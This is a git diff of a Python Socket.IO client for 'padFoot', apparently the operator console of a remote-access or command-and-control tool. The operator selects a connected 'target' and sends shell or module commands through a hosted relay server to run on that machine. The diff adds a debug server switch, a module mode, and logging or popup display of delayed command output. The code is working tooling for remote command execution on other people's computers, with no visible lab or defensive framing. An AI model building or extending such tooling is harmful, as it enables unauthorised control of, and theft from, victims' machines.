@@ -3,15 +3,23 @@ import threading
 import time
 import json
 import os
+import tkinter.messagebox as tkm
 import public_ip as ip
 import platform
 from dotenv import load_dotenv
 
 load_dotenv()
 
-#SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
-SERVER = 'https://padfoot-server.onrender.com'
+DEBUG = True #True/False
+
+match DEBUG:
+    case True:
+        SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
+    case False:
+        SERVER = 'https://padfoot-server.onrender.com'
+
 API_KEY = os.environ["API_KEY"]
+LATE_MODULE_OUTPUT = "log" #log/info
 
 # Connect to the Socket.IO server
 sio = socketio.Client()
@@ -79,6 +87,8 @@ def shell():
     global waiting, selected_target
     clear()
     print("Welcome to padFoot!")
+    if DEBUG:
+        print(f"debug mode enabled. connected to server: {SERVER}")
     while True:
         if selected_target != "":
             input_prompt = f"pF: {selected_target} >"
@@ -101,13 +111,21 @@ def shell():
                         if shellInput == "EXIT":
                             break
                         waiting = True
-                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target})
+                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target, 'module': False})
                         while waiting:
                             pass
                 case 'EXIT':
                     selected_target = ""
-                    break
                     continue
+                case 'module':
+                    while True:
+                        shellInput = str(input(f"pF/{selected_target}/MODULE >"))
+                        if shellInput == "EXIT":
+                            break
+                        waiting = True
+                        sio.emit('sendCommand', {'command': shellInput, 'target': selected_target, 'module': True})
+                        while waiting:
+                            pass
         match command:
             case 'list':
                 waiting = True
@@ -138,8 +156,15 @@ def getInfoResponse(data):
 @sio.on('sendCommandResponse')
 def sendCommandResponse(data):
     global waiting
-    print(data['output'])
-    waiting = False
+    if data['immediate']:
+        print(data['output'])
+        waiting = False
+    else:
+        match LATE_MODULE_OUTPUT:
+            case 'log':
+                open('log.txt', 'a').write(f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}\n\n\n\n')
+            case 'info':
+                tkm.showinfo(f'pF | {data["client"]}', f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}')
 
 @sio.on('getConnectedClientsResponse')
 def shellGetConnectedClientsResponse(data):
